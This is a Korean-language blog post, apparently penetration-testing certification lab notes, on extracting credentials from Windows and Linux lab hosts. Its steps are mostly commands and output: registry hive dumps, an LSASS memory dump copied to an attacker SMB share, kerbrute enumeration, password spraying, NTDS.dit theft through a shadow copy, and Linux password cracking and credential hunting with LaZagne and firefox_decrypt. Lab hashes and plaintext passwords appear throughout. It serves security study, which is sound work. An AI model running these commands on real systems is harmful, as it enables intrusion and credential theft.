---
title: "Password Attacks - Extracting Passwords from Windows and Linux"
date: 2026-08-15
layout: single
excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Password Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
---

# Window

## Windows Authentication Process

윈도우에선 로그인을 할때 각 단계를 거치게 된다.

우선 로그인을 하면 WINLOGON 서비스로 인해서 그 자격증명을 적는 란이 존재하게되고, 자격증명을 입력하면 LSA/LSASS가 그 자격증명과 일치하는지 확인하게 된다.

만약 LSASS가 일치하는 자격증명을 발견하지못하면 로그인에 실패하게되고, 발견하면 LSASS 메모리에 저장하는 구조이다.

그 LSASS가 보는 파일은 로컬이면 sam, 도메인 계정이면 ntds.dit 파일을 기준으로 참고한다.

즉, 따라서 lsass는 인증의 중심이며, 그 인증을 수행하기 위하여 sam, ntds.dit 파일을 참고하는 형태이다.

> 추가로 security 파일이 존재한다. 이 파일은 lsa가 따로 현재 자동화 로그인을 수행할때 그 자동화를 수행시키기위한 자격증명을 저장시켜야 하기에 저장시킨 숨켜진 자격증명을 가져오거나, dpapi의 복호화를 수행할때 필요한 키를 보관하는 파일이다. 

## Attacking SAM, SYSTEM, and SECURITY

우선 이렇게 sam, system, security 파일을 다운로드 받았다:

```powershell
*Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\system C:\system.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

현재 위 파일들은 사용중이기에 copy 같은 명령으로 복사하는것이 아닌 save를 통하여 복사를 해야한다.

이후 각 파일들을 다운로드 시켜주었다:

```powershell
*Evil-WinRM* PS C:\> download sam.save                                        
Info: Download successful!

*Evil-WinRM* PS C:\> download system.save                                  
Info: Download successful!

*Evil-WinRM* PS C:\> download security.save                                     
Info: Download successful!
```

이후, secretdump을 활용하여 덤프할수있다:

```bash
$ impacket-secretsdump -sam sam.save -system system.save -security security.save local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 
                  
```

이처럼 여러 유저들의 ntlm과, dpapl 복호화키가 나온것을 확인할수있고, _SC_gupdate(Service Control Manager) 관련 서비스 평문 계정이 존재한다.

이 계쩡은 서비스이기 레지스트리를 활용하여 어떤 사용자로 이뤄져있는지도 확인할수있다:

```powershell
*Evil-WinRM* PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ObjectName

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate
    ObjectName    REG_SZ    .\frontdesk
```

이처럼 현재 `frontdesk` 유저가 저 서비스의 관리자이며 최종적으로 이렇게된다:

```text
frontdesk:Password123
```

## Attacking LSASS

또한 위에서 보다시피 lsass 덤프를 활용하여 추출하는 방법이 있따.

lsass는 comsvcs.dll dll파일을 활용하여 미니 덤프를 수행할수있다.

우선 내부에 lssas.exe 서비스가 어떤 pid로 실행중인지 확인하였다:

![Password Attacks](/assets/cpts-infra/password-attacks-extracting-passwords-from-windows-and-linux/pw-attack1.png)

이처럼 현재 pid 660에서 실행중임을 확인하였다.

따라서 이를 활용하여 rundll32를 통해 덤프의 dll인 comsvcs.dll를 호출하여 lsass의 메모리를 덤프할수있다.

이렇게 명령을 작성하였다:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 660 C:\lsass.dmp full
```

이처럼 덤프에 성공하게되면 dump가 된 파일이 c디렉토리에 생성돼었다.

따라서 위 파일을 이용하여 오프라인으로 나의 로컬 터미널에서 pypykatz를 통해 덤프가 가능해질수있다.

우선 나의 로컬에 smbserver를 켜놓은후:

```bash
$ sudo impacket-smbserver share . -smb2support -username kali -password kali

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

net use를 통해 신뢰를 받을수 있게 설정하엿다:

![Password Attacks](/assets/cpts-infra/password-attacks-extracting-passwords-from-windows-and-linux/pw-attack2.png)

이후 copy 명령을 통해 보내주게 되면 전달에 성공하게된다:

```powershell
PS C:\Windows\system32> copy C:\lsass.dmp \\10.10.15.31\share
```

이후 pypykatz를 통하여 덤프해주었다:

```bash
$ pypykatz lsa minidump ./lsass.dmp 
INFO:pypykatz:Parsing file ./lsass.dmp
FILE: ======== ./lsass.dmp =======
== LogonSession ==
authentication_id 120980 (1d894)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2026-08-16T18:37:11.553911+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 120980
        == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [1d894]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: Vendor
                Domain: FS01
        == WDIGEST [1d894]==
                username Vendor
                domainname FS01
                password None
                password (hex)

# SKIP
```

이처럼 덤프에 성공하게된다.

## Attacking Active Directory and NTDS.dit

### 유저찾기

윈도우의 로컬 보관소 sam과 달리 AD 환경에서는 NTDS.DIT이 존재한다.

우선 이 공격을 수행하기전, 이러한 사용자 정보들이 존재하였다:

```text
John Marston
Carol Johnson
Jennifer Stapleton
```

이 정보들을 토대로 각 저 계정과 비슷한 여러 아이디를 생성해주는 username-anarchy 툴이 존재한다.

따라서 저 툴을 이용하여 이름들을 name.txt 파일로 저장한 후, 비슷한 아이디를 여러개 생성할수있다:

```bash
$ ./username-anarchy -i names.txt 

john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
carol
```

우선 도메인 명을 보기위해 nxc로 테스트를 하였다:

```bash
$ nxc smb 10.129.129.64 -u '' -p ''

SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\: 
```

이처럼 지금 ILF-DC01 이며 명은 ILF.local 임을 확인하였다

이를 토대로 만들어진 계정을 토대로 kerbrute를 통하여 유저를 열거할수잇따:

```bash
$ kerbrute userenum --dc 10.129.129.64 --domain ILF.local userenum.txt

2026/08/16 20:10:04 >  Using KDC(s):
2026/08/16 20:10:04 >   10.129.129.64:88

2026/08/16 20:10:05 >  [+] VALID USERNAME:       jmarston@ILF.local
2026/08/16 20:10:05 >  [+] VALID USERNAME:       cjohnson@ILF.local
2026/08/16 20:10:05 >  [+] VALID USERNAME:       jstapleton@ILF.local
2026/08/16 20:10:05 >  Done! Tested 43 usernames (3 valid) in 1.052 seconds
```

현재 jmarston, cjohnson, jstapleton 3명의 유저가 잡혔다.

이후 각 사용자마다 패스워드 브루트포싱을 시도한결과 이처럼 계정이 잡히게되었다:

```bash
$ nxc smb 10.129.129.64 -u jmarston -p /usr/share/set/src/fasttrack/wordlist.txt

SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
# SKIP
SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

그 결과 이처럼 jmarston유저의 패스워드까지 확보하게 되었다

PWD가 뜬걸 보니 관리자 계정임을 암시할수있다.

### ntds.dit

따라서 위에 winrm을 통하여 접속한 후 내부에 모든 권한이 활성화되어하였따:

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled

# SKIP
```

이 섹션 취지에 맞게 NTDS.DIT을 추출하여 할수있다.

우선 파일의 내용 해제하는 system파일을 먼저 save 후 다운로드 해주었다:

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> reg.exe save hklm\system C:\Users\jmarston\system

The operation completed successfully.
```

그 이후, ntds.dit은 실행 중인 DC가 NTDS.dit을 계속 사용하고 있어서 위처럼 세이브가 불가능하여 vssadmin을 통하여 카피하는 방식을 사용하거나 할수있따.

따라서 이렇게 카피하였따:

```powershell
*Evil-WinRM* PS C:\Users\jmarston> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {d6168e2d-bbb1-46a8-abf6-39af3d3f50f8}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

이처럼 c:\ 디렉토리를 카피하였다.

이를 활용하여 위 셰도우 카피 경로의 ntds.dit 파일을 가져와 현재 디렉토리로 복사하였따:

```powershell
*Evil-WinRM* PS C:\Users\jmarston> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit ./NTDS.dit

        1 file(s) copied.
```

이후 download를 통하여 나의 로컬로 복사한뒤에 시크릿 덤프를 활용하여 dc 유저들의 해시를 캐낼수가잇따:

```bash
$ impacket-secretsdump -ntds ntds.dit -system system LOCAL

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:faf26e8da1eead79a4538c5317233454:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::

# SKIP
```

또한 매우빠르게 NXC의 -M ntdsutil 옵션을 통하여 바로 해시를 가져오는 방식도 존재한다:

```bash
$ nxc smb 10.129.129.64 -u jmarston -p P@ssword! -M ntdsutil
SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

# SKIP

NTDSUTIL    10.129.129.64   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::                                                                                            
NTDSUTIL    10.129.129.64   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                    
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:faf26e8da1eead79a4538c5317233454:::                                                                                               
NTDSUTIL    10.129.129.64   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::                                                                                                   
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::                                                                                      
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::                                                                                      
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::                                                                                    
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::                                                                                       
NTDSUTIL    10.129.129.64   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
```

# Linux 

## Linux Authentication Process

리눅스에선 passwd 파일과 각 유저들의 자격증명이 존재하는 shadow 파일이 존재함을 알수있다.

만약 root 권한상승을 한 이후, 추가의 자격증명을 확보하기 위하여 shadow 파일과 passwd 을 혼합시켜 만드는 unshadow 도구를 활용하여 크랙에 시도할수있따:

```bash
$ unshadow passwd shadow > unshadowed.hashes
```

이후 hashcat을 사용하여 각 사용자의 자격증명을 가져오거나 할수있다:

```bash
$ hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt --show --username

sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
```

이처럼 sarah 계정은 `mariposa` 비번임을 확인하였다.

또한 john을 활용해 단일 크랙모드를 활용하여 각 사용자의 비번맞춤형으로 크랙에 성공하였다:

```bash
$ john  --single unshadowed.hashes

Martin1          (martin)
```

별개로 /etc/security/opasswd 도 존재한다

이건 예전에 사용했던 비밀번호 hash를 저장해서 password reuse를 막는 용도.
오래된 약한 hash가 있으면 이전 비밀번호 패턴을 알아낼 수 있음.

## Credential Hunting in Linux

리눅스에선 대부분 윈도우의 여러 레지스트리, LSASS 같은거와 다르게 파일 기반으로 자격증명을 저장시키기에 좀더 자격증명을 찾기 수월하다.

대부분의 자격증명은 이런곳에 존재한다:

```text
config + history + scripts + cron + SSH key + browser/keyring
```

이처럼 web에 쓰이는 config .conf 같은 파일에 자격증명이 존재할수있고, bash_history 에서와 같이 어떤 명령어 이후 자격증명을 쓰인 그런 경우도 존재하게된다.

이처럼 conf 파일 관련을 찾기위해 적을수가 있다:

```bash
kira@nix01:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/var/log/installer/subiquity-curtin-install.conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolved.conf.d/isc-dhcp-v4-ens192.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf
/etc/snmp/snmp.conf
/etc/ltrace.conf
/etc/apparmor/parser.conf
/etc/sysctl.conf
/etc/overlayroot.conf
/etc/security/limits.conf
/etc/security/pam_env.conf
/etc/security/access.conf
# SKIP
```

또한 이처럼 패스워드에 관련하여 grep을 이용해 찾는 방식도 존재한다:

```bash
kira@nix01:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /etc/alternatives/my.cnf
File:  /etc/mysql/debian.cnf
File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user            = mysql
File:  /etc/mysql/mysql.conf.d/mysql.cnf
File:  /etc/mysql/conf.d/mysqldump.cnf
File:  /etc/mysql/conf.d/mysql.cnf
File:  /etc/mysql/my.cnf
File:  /etc/mysql/mysql.cnf
File:  /etc/ssl/openssl.cnf
challengePassword               = A challenge password
```

그리고 txt 파일을 찾기 위하여 이런식으로 작성도 가능하며:

```bash
kira@nix01:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
/home/kira
/home/kira/.cache/fontconfig
/home/kira/.cache/libgweather
/home/kira/.cache/evolution
/home/kira/.cache/evolution/addressbook
/home/kira/.cache/evolution/addressbook/trash
/home/kira/.cache/evolution/sources
/home/kira/.cache/evolution/sources/trash
/home/kira/.cache/evolution/memos
/home/kira/.cache/evolution/memos/trash
# SKIP
```

또한 스크립트에서도 자격증명이 존재할수도 있기에 이런식으로 작성이 가능하다:

```bash
kira@nix01:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py
/etc/python3.8/sitecustomize.py
/etc/python3.9/sitecustomize.py
/usr/bin/mesa-overlay-control.py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/boot/grub/i386-pc/modinfo.sh
/etc/init.d/hwclock.sh
/etc/init.d/keyboard-setup.sh
/etc/init.d/console-setup.sh
/etc/console-setup/cached_setup_keyboard.sh
/etc/console-setup/cached_setup_terminal.sh
/etc/console-setup/cached_setup_font.sh
# SKIP
```

디비 파일도 무시 못하기에 DB 확장자 관련 파일을 찾고 그 안에서 자격증명을 찾을수도있다:

```bash
kira@nix01:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/hunspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/ispell.db
/home/kira/.mozilla/firefox/ytb95ytb.default-release/cert9.db
/home/kira/.mozilla/firefox/ytb95ytb.default-release/key4.db
# SKIP
```

또한 bash_history에서도 사용자가 적은 자격증명이 존재할수도 있다:

```bash
kira@nix01:~$ tail -n5 /home/*/.bash*
==> /home/kira/.bash_history <==
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su
# SKIP
```

그리고 리눅스 자격증명 찾기 관련해서 툴이 존재한다.

윈도우에서도 있었던 자동화 LaZagne 툴을 활용하여 자격증명을 토해낼수도 있게된다:

```bash
kira@nix01:~/Linux$ python3 laZagne.py all

# SKIP

------------------- Firefox passwords -----------------
                                                        
[+] Password found !!!                                                                                             
URL: https://dev.inlanefreight.com                                                                                 
Login: will@inlanefreight.htb
Password: TUqr7QfLTLhruhVbCP
```

또한 대부분 파이어 폭스를 사용하면 파이어폭스 브라우저에 웹 페이지 로그인 정보를 저장할 때, 해당 정보는 암호화되어 logins.json 파일에 저장되게 된다.

따라서 내부에 파일이 이렇게 존재함을 확인할수있다:

```bash
kira@nix01:~$ ls -l .mozilla/firefox/ | grep default

drwx------  2 kira kira 4096 Aug 17 04:29 lktd9y8y.default
drwx------ 10 kira kira 4096 Aug 17 04:29 ytb95ytb.default-release
```

이중 logins.json을 보면 이처럼 이름과 비밀번호가 암호화되어잇는것을 확인할수있다:

```bash
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://dev.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://dev.inlanefreight.com",
      "usernameField": "email",
      "passwordField": "password",
      "encryptedUsername": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEuPp+tkcSROBBikTaPORjVYFBK/x6zuYjnhWGHhp6xu2ok=",                                                                                                            
      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFinWQ8t9QusBBg6tPWTkhxcMRHwvfUZBs9zUh8mQ6MgpYI=",                                                                                                            
      "guid": "{317acef6-be5a-4df2-abfc-ce0566b6e975}",
      "encType": 1,
      "timeCreated": 1644420310215,
      "timeLastUsed": 1644420310215,
      "timePasswordChanged": 1644420310215,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

이제 이 복호화를 풀기위해 Firefox Decrypt 도구를 사용할수있따.

```bash
kira@nix01:~$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release

2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```